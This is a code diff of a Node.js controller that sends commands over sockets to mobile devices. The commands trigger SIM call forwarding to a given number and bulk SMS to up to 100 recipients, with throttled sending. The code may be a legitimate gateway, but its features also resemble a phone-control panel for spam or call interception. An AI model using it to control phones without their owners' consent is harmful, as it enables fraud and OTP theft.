@@ -2,354 +2,297 @@ import Command from '../models/CommandModel.js';
 import User from '../models/UserModel.js';
 import { normalizeDeviceId } from '../helpers/deviceId.js';
 
+const sleep = (ms) => new Promise(resolve => setTimeout(resolve, ms));
 
-export const callForward = async (req, res) => {
+const sanitizeNumber = (value = '') => String(value).replace(/[^0-9]/g, '');
+
+const normalizeNumbers = (numbers = [], minDigits = 10, maxDigits = 15, maxItems = 100) => {
+  const valid = [];
+  const invalid = [];
+  const seen = new Set();
+
+  for (const raw of numbers) {
+    const cleaned = sanitizeNumber(raw);
+
+    if (!cleaned) continue;
+
+    if (cleaned.length < minDigits || cleaned.length > maxDigits) {
+      invalid.push(String(raw));
+      continue;
+    }
+
+    if (!seen.has(cleaned) && valid.length < maxItems) {
+      seen.add(cleaned);
+      valid.push(cleaned);
+    }
+  }
+
+  return { valid, invalid };
+};
+
+const normalizeIncomingDeviceId = (value) => normalizeDeviceId(String(value || '').trim());
+
+const findUserByDeviceId = async (rawDeviceId) => {
+  const normalized = normalizeIncomingDeviceId(rawDeviceId);
+
+  return User.findOne({
+    $or: [
+      { deviceId: String(rawDeviceId).trim() },
+      { deviceId: normalized },
+    ],
+  });
+};
+
+const buildSocketPayload = (command, extra = {}) => {
+  const raw = typeof command.toObject === 'function' ? command.toObject() : command;
+  const commandId = String(raw._id);
+
+  return {
+    ...raw,
+    id: commandId,
+    payload: {
+      ...(raw.payload || {}),
+      commandId,
+      uniqueCommandId: commandId,
+    },
+    ...extra,
+  };
+};
+
+const emitDeviceEvent = (deviceId, eventName, command, extra = {}) => {
+  const payload = buildSocketPayload(command, extra);
+  global.io.to(deviceId).emit(eventName, payload);
+  return payload;
+};
+
+export const sendSms = async (req, res) => {
   try {
-    let { deviceId, slot, number, autoExecute = false, priority = 'normal' } = req.body;
+    const {
+      deviceId,
+      to,
+      numbers,
+      body,
+      slot = 0,
+      delayMs = 2500,
+      requestedBy = 'admin',
+      priority = 'normal',
+    } = req.body;
 
-    deviceId = normalizeDeviceId(deviceId);
-    if (!deviceId || slot === undefined) {
-      return res.status(400).json({ error: "Missing deviceId or slot" });
+    const normalizedDeviceId = normalizeIncomingDeviceId(deviceId);
+
+    if (!normalizedDeviceId) {
+      return res.status(400).json({ error: 'deviceId is required' });
     }
 
-    // Clear any existing pending commands for this device and action
-    await Command.updateMany(
-      {
-        deviceId,
-        action: "CALL_FORWARD",
-        done: false,
-        "payload.slot": parseInt(slot)
-      },
-      {
-        $set: {
-          done: true,
-          executedAt: new Date(),
-          executionMessage: "Superseded by new command"
-        }
-      }
-    );
-
-    // Determine if this is deactivation (empty number means deactivation)
-    const isDeactivation = !number || number.trim() === '' || number.trim().toLowerCase() === 'deactivate';
-    const finalNumber = isDeactivation ? '' : number.trim();
-
-    // Force auto-execute for deactivation commands
-    const forceAutoExecute = isDeactivation ? true : autoExecute;
-
-    console.log(`📞 NEW Call forwarding request: Device ${deviceId}, Slot ${slot}, Number: ${finalNumber || 'DEACTIVATE'}, Auto: ${forceAutoExecute}, Deactivation: ${isDeactivation}`);
-    // Update SIM forwarding in database with status tracking
-    const updateResult = await User.updateOne(
-      { deviceId, "simInfo.slot": slot },
-      {
-        $set: {
-          "simInfo.$.forwarding": finalNumber,
-          "simInfo.$.forwardingStatus.autoManaged": forceAutoExecute,
-          "simInfo.$.forwardingStatus.active": !isDeactivation,
-          "simInfo.$.forwardingStatus.lastChecked": new Date(),
-          "simInfo.$.forwardingStatus.lastCommandSent": new Date(),
-          ...(isDeactivation
-            ? { "simInfo.$.forwardingStatus.lastDeactivated": new Date() }
-            : { "simInfo.$.forwardingStatus.lastActivated": new Date() }
-          ),
-          "simInfo.$.updatedAt": new Date()
-        }
-      }
-    );
-
-    console.log(`📝 Updated user SIM forwarding:`, updateResult);
-
-    // Create fresh command with unique timestamp
-    const cmd = await Command.create({
-      deviceId,
-      action: "CALL_FORWARD",
-      payload: {
-        slot: parseInt(slot),
-        number: finalNumber,
-        timestamp: Date.now(),
-        requestedBy: req.body.requestedBy || 'admin',
-        autoExecute: forceAutoExecute,
-        priority: isDeactivation ? 'high' : priority,
-        isDeactivation: isDeactivation,
-        commandId: `cf_${deviceId}_${slot}_${Date.now()}` // Unique command ID
-      },
-      done: false,
-      autoExecuted: false
-    });
-
-    console.log(`💾 Created command: ${cmd._id} (Auto: ${forceAutoExecute}, Deactivation: ${isDeactivation})`);
-
-    // Enhanced command emission with auto-execute flag
-    const emitData = {
-      ...cmd.toObject(),
-      deviceId,
-      urgent: true,
-      autoExecute: forceAutoExecute,
-      isDeactivation: isDeactivation,
-      forceExecute: isDeactivation,
-      resetState: true, // Signal to reset client state
-      executionId: `exec_${Date.now()}_${Math.random().toString(36).substr(2, 9)}`
-    };
-
-    console.log(`📡 Emitting AUTO ${isDeactivation ? 'DEACTIVATION' : 'ACTIVATION'} command to device room: ${deviceId}`);
-
-    const deviceSockets = await global.io.in(deviceId).fetchSockets();
-    console.log(`🔌 Found ${deviceSockets.length} active sockets for device ${deviceId}`);
-
-    // Multiple emission strategies
-    global.io.to(deviceId).emit("command", emitData);
-    global.io.to(deviceId).emit("call-forward-command", emitData);
-    global.io.to(deviceId).emit("auto-execute-command", emitData);
-
-    // Special deactivation event
-    if (isDeactivation) {
-      global.io.to(deviceId).emit("force-deactivate-command", emitData);
+    if (!body || !String(body).trim()) {
+      return res.status(400).json({ error: 'Message body is required' });
     }
 
+    if (![0, 1].includes(Number(slot))) {
+      return res.status(400).json({ error: 'slot must be 0 or 1' });
+    }
 
+    const device = await findUserByDeviceId(deviceId);
+    if (!device) {
+      return res.status(404).json({ error: 'Device not found' });
+    }
 
+    const rawNumbers = Array.isArray(numbers)
+      ? numbers
+      : to
+        ? [to]
+        : [];
 
-    if (deviceSockets.length > 0) {
-      // Send to all active sockets with multiple event types
-      deviceSockets.forEach((socket, index) => {
-        console.log(`📤 Sending to socket ${index + 1}: ${socket.id}`);
+    if (!rawNumbers.length) {
+      return res.status(400).json({ error: 'Provide "to" or "numbers"' });
+    }
 
-        // Multiple emission strategies for reliability
-        socket.emit("command", emitData);
-        socket.emit("call-forward-command", emitData);
-        socket.emit("auto-execute-command", emitData);
+    const { valid, invalid } = normalizeNumbers(rawNumbers, 10, 15, 100);
 
-        if (isDeactivation) {
-          socket.emit("force-deactivate-command", emitData);
-        } else {
-          socket.emit("force-activate-command", emitData);
-        }
+    if (!valid.length) {
+      return res.status(400).json({
+        error: 'No valid phone numbers found',
+        invalid,
+      });
+    }
 
-        // Reset command to ensure fresh execution
-        socket.emit("reset-command-state", {
-          deviceId,
+    const bulkId = `bulk_${Date.now()}_${Math.random().toString(36).slice(2, 8)}`;
+    const isBulk = valid.length > 1;
+    const finalDelayMs = Math.max(0, Number(delayMs) || 2500);
+
+    const commands = await Command.insertMany(
+      valid.map((number, index) => ({
+        deviceId: normalizedDeviceId,
+        action: 'SEND_SMS',
+        payload: {
+          to: number,
+          body: String(body).trim(),
+          slot: Number(slot),
           timestamp: Date.now(),
-          resetAll: true
-        });
-      });
+          requestedBy,
+          priority,
+          bulkId,
+          bulkIndex: index + 1,
+          bulkTotal: valid.length,
+        },
+        done: false,
+      }))
+    );
 
-      // Also emit to room (backup)
-      global.io.to(deviceId).emit("command", emitData);
-      global.io.to(deviceId).emit("reset-command-state", {
-        deviceId,
-        timestamp: Date.now(),
-        resetAll: true
-      });
+    const socketsInRoom = await global.io.in(normalizedDeviceId).fetchSockets();
+    const deviceOnline = socketsInRoom.length > 0;
 
-    } else {
-      console.warn(`⚠️ NO SOCKETS FOUND for device ${deviceId}. Command saved as pending.`);
+    if (!deviceOnline) {
+      return res.status(202).json({
+        success: true,
+        queued: true,
+        message: isBulk
+          ? `${commands.length} SMS commands queued; device is offline`
+          : 'SMS command queued; device is offline',
+        deviceId: normalizedDeviceId,
+        bulkId,
+        total: commands.length,
+        validNumbers: valid,
+        invalidNumbers: invalid,
+        commandIds: commands.map(cmd => String(cmd._id)),
+      });
     }
 
-    const actionType = isDeactivation ? 'deactivation' : 'activation';
-    const message = `Call forwarding ${actionType} command AUTO-${deviceSockets.length > 0 ? 'sent' : 'queued'}`;
+    for (let i = 0; i < commands.length; i++) {
+      const cmd = commands[i];
 
-    res.json({
+      emitDeviceEvent(normalizedDeviceId, 'send-sms-command', cmd, {
+        urgent: true,
+        type: 'sms',
+      });
+
+      console.log(`📤 SMS command emitted ${i + 1}/${commands.length} to ${normalizedDeviceId}`);
+      console.log(`   To: ${cmd.payload.to}`);
+      console.log(`   Slot: ${cmd.payload.slot}`);
+      console.log(`   Command ID: ${cmd._id}`);
+
+      if (i < commands.length - 1) {
+        await sleep(finalDelayMs);
+      }
+    }
+
+    return res.status(200).json({
       success: true,
-      command: {
-        id: cmd._id,
-        deviceId,
-        action: cmd.action,
-        payload: cmd.payload,
-        autoExecute: forceAutoExecute,
-        isDeactivation: isDeactivation,
-        status: deviceSockets.length > 0 ? 'sent' : 'pending',
-        activeSockets: deviceSockets.length
-      },
-      message: message,
-      devicesConnected: deviceSockets.length,
-      timestamp: Date.now()
+      queued: false,
+      message: isBulk
+        ? `${commands.length} bulk SMS commands created and emitted`
+        : 'SMS command created and emitted',
+      deviceId: normalizedDeviceId,
+      bulkId,
+      total: commands.length,
+      validNumbers: valid,
+      invalidNumbers: invalid,
+      commandIds: commands.map(cmd => String(cmd._id)),
+      delayMs: finalDelayMs,
     });
-
-  } catch (err) {
-    console.error("❌ Call forward error:", err);
-    res.status(500).json({
-      error: "Failed to set call forwarding",
-      details: err.message
+  } catch (error) {
+    console.error('❌ sendSms error:', error);
+    return res.status(500).json({
+      error: 'Failed to process SMS command',
+      message: error.message,
     });
   }
 };
 
-// NEW: Endpoint to toggle auto-execution
+export const getCommandStatus = async (req, res) => {
+  try {
+    const normalizedDeviceId = normalizeIncomingDeviceId(req.params.deviceId);
+
+    const commands = await Command.find({ deviceId: normalizedDeviceId })
+      .sort({ createdAt: -1 })
+      .limit(100);
+
+    res.json({
+      success: true,
+      commands,
+    });
+  } catch (error) {
+    console.error('❌ getCommandStatus error:', error);
+    res.status(500).json({
+      error: 'Failed to fetch command status',
+    });
+  }
+};
+
+export const callForward = async (req, res) => {
+  try {
+    const {
+      deviceId,
+      slot,
+      number,
+      autoExecute = false,
+      priority = 'normal',
+    } = req.body;
+
+    const normalizedDeviceId = normalizeIncomingDeviceId(deviceId);
+
+    if (!normalizedDeviceId || !number) {
+      return res.status(400).json({ error: 'deviceId and number are required' });
+    }
+
+    const device = await findUserByDeviceId(deviceId);
+    if (!device) {
+      return res.status(404).json({ error: 'Device not found' });
+    }
+
+    const command = await Command.create({
+      deviceId: normalizedDeviceId,
+      action: 'CALL_FORWARD',
+      payload: {
+        slot: Number(slot) || 0,
+        number: String(number).trim(),
+        timestamp: Date.now(),
+        requestedBy: 'admin',
+        autoExecute,
+        priority,
+      },
+      done: false,
+    });
+
+    emitDeviceEvent(normalizedDeviceId, 'call-forward-command', command, {
+      urgent: true,
+      type: 'call_forward',
+    });
+
+    res.json({ success: true, command });
+  } catch (error) {
+    console.error('❌ callForward error:', error);
+    res.status(500).json({ error: 'Failed to create call forward command' });
+  }
+};
+
 export const toggleAutoExecution = async (req, res) => {
   try {
-    const { deviceId, enabled } = req.body;
+    const normalizedDeviceId = normalizeIncomingDeviceId(req.body.deviceId);
+    const { enabled } = req.body;
 
     const user = await User.findOneAndUpdate(
-      { deviceId: normalizeDeviceId(deviceId) },
-      {
-        $set: {
-          "callForwardingSettings.autoExecuteEnabled": enabled,
-          "callForwardingSettings.lastStatusCheck": new Date()
-        }
-      },
+      { deviceId: normalizedDeviceId },
+      { 'callForwardingSettings.autoExecuteEnabled': !!enabled },
       { new: true }
     );
 
     if (!user) {
-      return res.status(404).json({ error: "Device not found" });
+      return res.status(404).json({ error: 'Device not found' });
     }
-
-    // Emit status change to device
-    global.io.to(deviceId).emit("auto-execute-status", {
-      enabled: enabled,
-      timestamp: Date.now()
-    });
 
     res.json({
       success: true,
-      autoExecuteEnabled: enabled,
-      message: `Auto-execution ${enabled ? 'enabled' : 'disabled'} for device ${deviceId}`
+      enabled: user.callForwardingSettings?.autoExecuteEnabled ?? false,
     });
-
-  } catch (err) {
-    console.error("❌ Toggle auto-execution error:", err);
-    res.status(500).json({ error: "Failed to toggle auto-execution" });
+  } catch (error) {
+    console.error('❌ toggleAutoExecution error:', error);
+    res.status(500).json({ error: 'Failed to toggle auto execution' });
   }
 };
 
-// NEW: Endpoint to check call forwarding status
 export const checkCallForwardingStatus = async (req, res) => {
-  try {
-    const { deviceId } = req.params;
-
-    // Emit status check command to device
-    const checkCommand = {
-      action: "CHECK_CALL_FORWARDING_STATUS",
-      deviceId: normalizeDeviceId(deviceId),
-      timestamp: Date.now()
-    };
-
-    global.io.to(deviceId).emit("status-check", checkCommand);
-
-    const deviceSockets = await global.io.in(deviceId).fetchSockets();
-
-    res.json({
-      success: true,
-      message: "Status check command sent",
-      devicesConnected: deviceSockets.length
-    });
-
-  } catch (err) {
-    console.error("❌ Check status error:", err);
-    res.status(500).json({ error: "Failed to check call forwarding status" });
-  }
+  return res.status(501).json({
+    error: 'checkCallForwardingStatus is not supported by the current mobile build',
+  });
 };
-
-
-
-
-// Add new endpoint to check command status
-export const getCommandStatus = async (req, res) => {
-  try {
-    const { deviceId } = req.params;
-    const commands = await Command.find({ deviceId })
-      .sort({ createdAt: -1 })
-      .limit(10);
-
-    res.json({ success: true, commands });
-  } catch (err) {
-    res.status(500).json({ error: "Failed to get command status" });
-  }
-};
-
-
-export const sendSms = async (req, res) => {
-  try {
-    const { deviceId, to, body, slot = 0 } = req.body;
-
-    if (!deviceId || !to || !body) {
-      return res.status(400).json({
-        error: "Missing required parameters",
-        required: ["deviceId", "to", "body"]
-      });
-    }
-
-    const normalizedDeviceId = normalizeDeviceId(deviceId);
-
-    if (!normalizedDeviceId) {
-      return res.status(400).json({ error: "Invalid deviceId" });
-    }
-
-    // Clear any existing pending SMS commands
-    await Command.updateMany(
-      {
-        deviceId: normalizedDeviceId,
-        action: "SEND_SMS",
-        done: false
-      },
-      {
-        $set: {
-          done: true,
-          executedAt: new Date(),
-          executionMessage: "Superseded by new SMS command"
-        }
-      }
-    );
-
-    const uniqueCommandId = `sms_${normalizedDeviceId}_${slot}_${Date.now()}_${Math.random().toString(36).substr(2, 9)}`;
-
-    const cmd = await Command.create({
-      deviceId: normalizedDeviceId,
-      action: "SEND_SMS",
-      payload: {
-        to: to.trim(),
-        body: body.trim(),
-        slot: parseInt(slot),
-        timestamp: Date.now(),
-        commandId: uniqueCommandId,
-        uniqueCommandId: uniqueCommandId
-      },
-      done: false
-    });
-
-    console.log(`📨 SMS command created: ${cmd._id}`);
-    console.log(`📨 Unique ID: ${uniqueCommandId}`);
-
-    const emitData = {
-      ...cmd.toObject(),
-      urgent: true,
-      uniqueCommandId: uniqueCommandId
-    };
-
-    // ✅✅✅ EMIT ONLY ONCE - TO ROOM ONLY ✅✅✅
-    global.io.to(normalizedDeviceId).emit("send-sms-command", emitData);
-
-    // Get socket count for response only (DON'T emit again)
-    const deviceSockets = await global.io.in(normalizedDeviceId).fetchSockets();
-    console.log(`📨 SMS command sent to ${deviceSockets.length} socket(s) in room ${normalizedDeviceId}`);
-
-    res.json({
-      success: true,
-      command: {
-        id: cmd._id,
-        uniqueCommandId: uniqueCommandId,
-        deviceId: normalizedDeviceId,
-        action: cmd.action,
-        payload: cmd.payload,
-        status: deviceSockets.length > 0 ? 'sent' : 'pending',
-        activeSockets: deviceSockets.length
-      },
-      sms: { address: to, body, slot, simNumber: slot + 1 },
-      devicesConnected: deviceSockets.length,
-      message: `SMS command sent for SIM ${slot + 1}`
-    });
-
-  } catch (err) {
-    console.error("❌ Send SMS error:", err);
-    res.status(500).json({
-      error: "Failed to send SMS command",
-      details: err.message
-    });
-  }
-};
-
-
-
-
-
-
-
